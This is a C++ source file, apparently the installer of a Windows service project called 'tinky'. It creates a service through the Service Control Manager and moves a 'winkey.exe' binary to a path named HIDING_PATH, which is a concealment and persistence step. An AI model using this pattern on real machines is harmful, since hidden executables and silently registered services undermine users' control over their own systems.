#include "tinky.hpp"
#include <iostream>
#include "utils.hpp"

using namespace std;

extern tinky_t tinky;

int openSCM(DWORD desiredAccess) {
	tinky.scmHandler = OpenSCManagerA(NULL, SERVICES_ACTIVE_DATABASEA, desiredAccess);
	if (!tinky.scmHandler) {
		cerr	<< "Error while accessing Service Control Manager\n";
		return (FAILURE);
	}
	return (SUCCESS);
}

static BYTE createService(void) {
	if (!openSCM(SC_MANAGER_CREATE_SERVICE))
		return (FAILURE);

	tinky.serviceHandler = CreateServiceA(
		tinky.scmHandler,
		SVC_NAME,
		SVC_NAME,
		SC_MANAGER_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL, // should log on error
		getServicePath(SVC_NAME).c_str(),
		NULL, NULL, NULL, NULL, NULL
	);
	if (!tinky.serviceHandler) {
		if (GetLastError() == ERROR_SERVICE_EXISTS)
			cerr	<< "Service tinky already exist\n";
		return (FAILURE);
	}
	return (SUCCESS);
}

static BYTE movWinkey(void) {
	string processPath = getServicePath("winkey");

	if (!MoveFileExA(
			processPath.c_str(), 
			HIDING_PATH, 
			MOVEFILE_REPLACE_EXISTING
		)) {
		cerr << "Failed to move winkey.exe... error code: "<< GetLastError() <<  "\n";
		return (FAILURE);
	}
	return (SUCCESS);
}

int install(void) {
	if (!movWinkey())
		return (FAILURE);
	if (!createService())
		return (FAILURE);
	cout	<< "Service installed successfully\n";
	return (SUCCESS);
}